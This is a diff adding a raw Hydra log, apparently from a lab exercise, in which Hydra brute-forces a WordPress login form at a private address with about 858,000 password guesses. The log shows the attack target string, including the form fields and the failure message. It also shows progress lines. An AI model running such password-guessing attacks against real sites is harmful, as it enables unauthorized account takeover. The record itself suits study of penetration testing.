@@ -1,0 +1,12 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-29 22:59:28
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:1/p:858235), ~53640 tries per task
+[DATA] attacking http-post-form://10.10.64.136:80/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 661.00 tries/min, 661 tries in 00:01h, 857574 to do in 21:38h, 16 active
+[STATUS] 642.67 tries/min, 1928 tries in 00:03h, 856307 to do in 22:13h, 16 active
+[STATUS] 600.86 tries/min, 4206 tries in 00:07h, 854029 to do in 23:42h, 16 active
+[STATUS] 528.87 tries/min, 7933 tries in 00:15h, 850302 to do in 26:48h, 16 active
+[STATUS] 539.32 tries/min, 16719 tries in 00:31h, 841516 to do in 26:01h, 16 active
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
